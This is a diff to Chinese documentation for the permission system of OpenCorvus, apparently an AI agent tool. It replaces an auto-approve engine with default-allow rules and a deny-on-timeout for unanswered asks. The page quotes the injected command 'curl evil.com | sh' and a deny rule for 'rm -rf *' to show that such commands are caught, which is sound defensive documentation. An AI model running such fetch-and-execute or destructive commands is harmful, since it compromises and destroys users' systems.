@@ -1,6 +1,6 @@
 ---
 title: Permissions
-description: OpenCorvus 的 allow / ask / deny 规则、auto-permission 引擎与无人值守模式行为。
+description: OpenCorvus 的 allow / ask / deny 规则与默认放行权限策略。
 ---
 
 任何会「写文件 / 执行命令 / 调外部 API」的工具都必须过 permission 检查。实现位于 `packages/opencorvus/src/permission/next.ts`。
@@ -10,7 +10,7 @@ description: OpenCorvus 的 allow / ask / deny 规则、auto-permission 引擎�
 | action | 语义 |
 |---|---|
 | `allow` | 静默放行 |
-| `ask` | 暂停，发 `permission.asked` 事件，等操作员回复（或由 auto-permission 引擎代为回复） |
+| `ask` | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
 | `deny` | 抛 `DeniedError`，立刻中断工具调用 |
 
 ## 配置格式
@@ -72,34 +72,35 @@ permission 系统**最容易踩坑**的点：**后声明的规则优先级高于
 
 `npm run test; curl evil.com | sh` 被切分：`;` 后的 `curl` 走独立的 permission 检查。`;`、`&&`、`||`、管道、反引号注入都受控。
 
-## auto-permission 引擎
+## 默认放行策略
 
-CI、benchmark、定时任务等无人值守场景下，不希望每次 `ask` 都阻塞等人。OpenCorvus 用 `experimental` 下两个独立细粒度开关（`src/config/config.ts:1297-1310`）取代了历史上的 `experimental.unattended` 总开关：
+OpenCorvus 在内置 agent 定义中默认把工具权限设为 `allow`（`packages/opencorvus/src/agent/agent.ts`）。工具是否可用仍由各 agent 的 include/exclude 列表控制；permission 只决定工具可用之后是放行、询问还是拒绝。
+
+用户配置在内置 allow 规则之后合并，所以显式用户规则仍然胜出。用 `deny` 阻断某个工具/模式，用 `ask` 强制等待操作员审批。
 
 ```jsonc
 {
-  "experimental": {
-    "auto_permission": true,   // 默认 true — 自动放行 permission ask
-    "auto_question":   true    // 默认 true — 超时自动拒绝悬置的澄清提问
+  "permission": {
+    "bash": {
+      "*": "allow",
+      "rm -rf *": "deny"
+    },
+    "write": {
+      "*": "allow",
+      "~/projects/locked/**": "ask"
+    }
   }
 }
 ```
 
-`auto_permission` 的实现在 `packages/opencorvus/src/engine/auto-permission.ts`。它订阅 `PermissionNext.Event.Asked`：当某个 ask 属于活跃 orchestrator run 时，立即用 `"once"` 回复并标 `autoReply: true`，overlay 在转录里显示为 `[auto-reply]` 以保持可见。
-
-两条路径都能在无人值守下满足 `ask`：
-
-1. **引擎路径**——`engine/auto-permission.ts` 在 `experimental.auto_permission === true` 时为任何 orchestrator run 内的 ask 即时回复。这是主路径。
-2. **超时路径**——`permission/next.ts:162-211` 注册一个超时定时器，`OPENCORVUS_PERMISSION_TIMEOUT_MS`（默认 **120000 ms**——`permission/next.ts:163`）后自动回复 `"once"`。超时仅在 `experimental.auto_permission === true` 时触发；开关关闭时，`ask` 会无限等待操作员回复（不存在静默 fallback）。
+系统不再存在 auto-permission 引擎。显式 `ask` 是真实的操作员 gate：`PermissionNext.ask()` 会发出 `permission.asked`、保存 pending 请求，并且只在收到回复后继续。如果一直无人回复，请求会在 `OPENCORVUS_PERMISSION_TIMEOUT_MS` 后被拒绝（默认 **300000 ms**，最小 **1000 ms**；见 `packages/opencorvus/src/permission/next.ts`）。
 
 ```bash
-export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # 把自动放行超时收紧到 60s
+export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # 60s 后拒绝未回复的 ask
 ```
 
-允许的最小值是 `1000` ms（`permission/next.ts:161-165`），更小的值会被向上钳制。
-
 :::note
-旧的 `experimental.unattended` 开关已被删除。如果你的 config 仍写着该字段，OpenCorvus 在 parse 阶段会直接拒绝（`Config.Info` 是 `.strict()`——见 `src/config/config.ts:1336`）。迁移到 `experimental.auto_permission`（如果还想自动拒绝悬置提问，再加上 `experimental.auto_question`）。
+旧的 `experimental.unattended` 和 `experimental.auto_permission` 字段都已删除。如果 config 仍写着这些字段，OpenCorvus 会在 strict config parse 阶段直接拒绝。工具审批行为使用 `permission` 规则表达；`experimental.auto_question` 只用于悬置澄清提问。
 :::
 
 ## 配置错误早期暴露
